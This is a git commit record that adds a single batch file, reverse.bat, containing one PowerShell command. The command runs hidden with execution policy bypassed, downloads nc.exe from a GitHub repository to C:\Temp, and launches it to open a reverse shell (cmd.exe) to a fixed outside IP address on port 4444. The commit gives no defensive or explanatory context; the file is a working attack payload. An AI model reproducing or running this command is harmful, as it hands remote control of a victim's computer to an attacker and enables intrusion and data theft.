a087ed2cf0e5114f525af94c67c99c51132de867
Damien Keffyn <damien.keffyn@mac.com>
2024-09-27 17:52:04 +1000

    Add files via upload

---
+++ reverse.bat
@@ -0,0 +1,1 @@
+powershell -w hidden -NoP -NonI -Exec Bypass -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/int0x33/nc.exe/raw/master/nc.exe','C:\Temp\nc.exe');Start-Process 'C:\Temp\nc.exe' -ArgumentList '193.114.96.29 4444 -e cmd.exe' -WindowStyle Hidden"
